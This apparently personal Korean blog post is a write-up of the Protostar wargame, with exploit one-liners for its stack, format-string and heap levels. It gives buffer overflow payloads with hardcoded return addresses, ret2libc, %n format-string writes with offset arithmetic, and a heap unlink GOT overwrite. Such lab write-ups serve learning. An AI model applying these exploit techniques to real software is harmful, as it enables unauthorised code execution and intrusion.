---
layout: post
title: "protostar"
description: "protostar"
date: 2017-02-17
tags: [protostar, pwnable]
comments: true
share: true
---

##### stack0

``` python
(python -c 'print "A"*65';cat)|./stack0
```

##### stack1

``` python
./stack1 `python -c 'print "A"*64+"\x64\x63\x62\x61"'`
```

##### stack2

``` python
export GREENIE=`python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"'`
./stack2
```

##### stack3

``` python
(python -c 'print "A"*64+"\x24\x84\x04\x08"';cat)|./stack3
```

##### stack4

``` python
(python -c 'print "A"*76+"\xf4\x83\x04\x08"';cat)|./stack4
```

##### stack5

``` python
ulimit -c unlimited
export aa="ls -al"
(python -c 'print "A"*76+"\xb0\xff\xec\xb7"+"AAAA"+"\x86\xff\xff\xbf"';cat)|./stack5
```

![protostar](/assets/images/protostar/protostar-01.PNG)

stack5번은 쉘코드 실행할 때 주소가 바뀌어서 core 덤프로 분석을 해서 바뀐 /bin/sh 주소를 넣었지만 안됐다.
그래서 ls -al이 박힌 환경변수에 넣고 RTL 했더니 정상적으로 뜬다.

##### stack6

``` python
ulimit -c unlimited
export aa="ls -al"
(python -c 'print "A"*76+"\xb0\xff\xec\xb7"+"AAAA"+"\x2c\xfa\xff\xbf"';cat)|./stack6
```

![protostar](/assets/images/protostar/protostar-02.png)

##### stack7

``` python
ulimit -c unlimited
export aa="ls -al"
(python -c 'print "A"*80+"\x83\x83\x04\x08"+"\xb0\xff\xec\xb7"+"AAAA"+"\x2c\xfa\xff\xbf"')|./stack7
```

![protostar](/assets/images/protostar/protostar-03.png)

0xb0xxxxxxxx 주소도 사용 불가능하다. ret에 ret를 넣어서 ret+4에 해당하는 주소로 넘어가고 RTL 공격이 가능해진다.

##### format0

```python
./format0 `python -c 'print "A"*64+"\xef\xbe\xad\xde"'`
```

##### format1

```python
./format1 `python -c 'print "\x38\x96\x04\x08AAA"+",%129$x"+",%129$x"'`
./format1 `python -c 'print "\x38\x96\x04\x08AAA"+",%129$n"+",%129$x"'`
```

![protostar](/assets/images/protostar/protostar-04.png)

%x 했을 때 값이 나눠져서 대충 때려 맞추는 식으로 했는데 .. 성공했다.

##### format2

```python
(python -c 'print "\xe4\x96\x04\x08"+"%60c%4$n"')|./format2
```

![protostar](/assets/images/protostar/protostar-05.png)

format1번처럼 값이 흩어져 있지 않고 4번째 주소에 바로 박혀있었다. 그래서 target is number가 바뀌는 것을 보고 64를 맞춰서 풀었다.

![protostar](/assets/images/protostar/protostar-06.png)

##### format3

![protostar](/assets/images/protostar/protostar-07.png)

12번째에 0x41이 박혀있었다.

``` python
(python -c 'print "\xf4\x96\x04\x08"+"\xf6\x96\x04\x08"+"%21820c%12$n%43966c%13$n"')|./format3
```

넣을 값의 주소는

080496f4 g     O .bss	00000004              target

target에 들어갈 주소는 0x01025544이다.

포맷 스트링은 2바이트씩 끊어서 넣어야하기 때문에 주소값을 2개 넣었고,

앞에는 5544 - 8byte한 10진수 값 (8바이트를 빼는 이유는 앞에서 주소 값을 넣을 때 8바이트를 사용 했기 때문이다.)

뒤에는 0102인데 여기서 5544를 빼면 음수가 나오기 때문에 10102 - 5544를 하면 4바이트가 박히고 나머지 1바이트는 밀리게 되므로 상관이 없다.

뒤에가 0102이고 앞이 5544인 이유는 리틀 엔디언 때문이다.

![protostar](/assets/images/protostar/protostar-08.png)

![protostar](/assets/images/protostar/protostar-09.png)


##### format4

문제의 힌트에서 objdump -TR을 사용하라고 한다.

![protostar](/assets/images/protostar/protostar-14.png)

![protostar](/assets/images/protostar/protostar-13.png)

4번째에 0x41이 박혔다. 그 이후로 잘 모르겠다.. 더 찾아봐야겠다.

##### heap0

![protostar](/assets/images/protostar/protostar-10.png)

heap은 malloc으로 원하는 크기의 공간을 가지게 되서 그 공간을 다 채우고 더 넣으면 오버플로우가 생긴다.

그래서 A로 buffer + dummy + sfp 인 것 같은데 아무튼 72바이트 다음에 4바이트가 nowinner를 가리키고 있었다.

그래서 winner의 주소값을 알아내고 level passed를 띄웠다.

![protostar](/assets/images/protostar/protostar-11.png)

##### heap1

소스코드를 보면 malloc이 8바이트 생성을 했는데 입력한 값들을 strcpy로 복사를 한다. 첫번째 i1->name에서 오버플로우를 시켜서 두번째에 값을 넣을 주소를 변조 시켜주면 풀 수 있다.

![protostar](/assets/images/protostar/protostar-18.png)

gdb로 까보니 puts로 출력되는 것을 보고 puts의 got에 winner 함수의 주소를 넣었더니 풀렸다.

![protostar](/assets/images/protostar/protostar-15.png)

![protostar](/assets/images/protostar/protostar-16.png)

![protostar](/assets/images/protostar/protostar-17.png)

##### heap3

free를 연속적으로 해서

마지막에 dynamic failed?를 출력할 때 puts를 사용했는데 put GOT에 winner 함수를 넣으면 풀릴 것 이다.


![protostar](/assets/images/protostar/protostar-19.png)

32바이트 크기를 malloc 했고 8바이트는 이에 대한 정보가 들어있다. 그래서 총 40바이트다.

"\x90"으로 버퍼를 채우고 puts got에 winner 함수를 덮어 쓰려고 했는데 세그먼트 폴트가 뜬다. 권한 문제였다.

그래서 실행 할 공간인 스택에 넣기로 했다. 그래서 winner shellcode를 넣고 \xfc\xff\xff\xff를 넣음으로써 prev_size를 조작해서 b address+4로 인식 한다.

prev_size는 이전 chunk의 크기 정보를 기록하는데 이전 chunk의 위치를 조작하는 것이다.

fd+12=bk, bk+8=fd를 이용해서 원하는 주소에 원하는 값을 넣어서 실행 할 수 있다.

그래서 aaaa로 더미 값을 넣고 우리가 실행해야 할 puts got의 -12주소인 0x0804b128-12 = 0x0804b11c를 fd에 넣고 bk에 0x0804c008(winner 함수)을 넣어서 조작을 한다.

마지막 A는 값을 무조건 3개를 넣어야 하니까 dummy 값으로 아무거나 넣었다.


관련 문서와 문제를 계속 풀어봐야겠다..
